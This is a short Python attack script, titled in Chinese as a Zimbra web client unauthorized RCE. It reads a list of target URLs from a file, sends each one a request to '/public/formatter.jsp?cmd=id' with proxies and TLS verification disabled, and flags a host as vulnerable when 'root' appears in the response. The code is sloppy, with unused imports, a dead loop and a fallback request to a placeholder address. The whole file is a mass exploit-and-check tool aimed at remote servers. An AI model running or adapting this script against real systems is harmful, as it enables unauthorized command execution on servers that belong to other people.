#Zimbra 网络客户端登录未授权RCE

from sqlite3 import paramstyle
from tarfile import HeaderError
import requests
import re



#生成拼接url
urls = []
with open ("rouji.txt") as f:
    for line in f.readlines():
        line = line.strip()
        urls.append(line)

#print(urls[0])

payload = '/public/formatter.jsp?cmd=id'

for i in urls:
    url = i + payload
url = urls[0]+payload

payload_urls = ["{0}{1}".format(url, payload) for url in urls]

# for i in payload_urls:
#     print(i)



def expolit():


    headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
                "Connection": "close",
            }
    
   
       
    for url2 in payload_urls:
        print(url2)
        #url2 是最终需要请求的url
        proxy = { "http": None, "https": None}
        
        try:
            r = requests.get(url2,verify=False,headers=headers,proxies=proxy)
        #print(r.text)
        except:
            r = requests.get("http://xxx.xxx.xxx.xxx:xx/")
        
        if re.findall('root',r.text):
            print("it have a unauth vuln")
        else:
            print("[-] Vuln Check Failed... ...")
            
        
    
    

def main():
    expolit()



if __name__ == '__main__':
    main()